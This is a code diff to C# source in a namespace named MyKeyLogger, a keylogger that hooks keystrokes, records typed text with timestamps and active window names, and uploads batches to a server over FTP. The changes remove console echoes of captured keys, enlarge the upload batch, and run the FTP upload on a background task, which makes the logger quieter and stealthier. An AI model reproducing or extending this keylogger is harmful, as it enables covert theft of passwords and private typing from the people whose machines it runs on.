@@ -9,6 +9,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 using Microsoft.Win32.SafeHandles;
 
 namespace MyKeyLogger
@@ -152,7 +153,6 @@ namespace MyKeyLogger
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
 				int myASCIIKey = Marshal.ReadInt32(lParam);
-		        Console.WriteLine(myASCIIKey);
 		        CapsLock = Console.CapsLock;
 		        var modif = Control.ModifierKeys;
 		        //Console.WriteLine(modif);
@@ -204,18 +204,20 @@ namespace MyKeyLogger
 						        }
 					        }
 				        }
-				        Console.WriteLine(val);
+				        //Console.WriteLine(val);
 				        if (val != "" && "\\`".Contains(val))
 					        val = "\\" + val;
 				        data = data + val;
-				        Console.WriteLine(data.Length);
+				        //Console.WriteLine(data.Length);
 			        }
-		        if (data.Length > 150)
+		        if (data.Length > 350)
 				{
 
 			        data = data + "\n";
-			        ServerFTP.ConnectionServer(data);
+			        string tempData = data;
 			        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
+			        //ServerFTP.ConnectionServer(data);
+			        Task.Factory.StartNew(() => ServerFTP.ConnectionServer(tempData));
 		        }
 
 
@@ -225,11 +227,11 @@ namespace MyKeyLogger
         public static void Start()
         {        	
 	        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
-        	var handle = GetConsoleWindow();
+        	//var handle = GetConsoleWindow();
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
-            OperationKey.TurnOFFCapsLockKey();
+            //OperationKey.TurnOFFCapsLockKey();
         }
 	}
 	
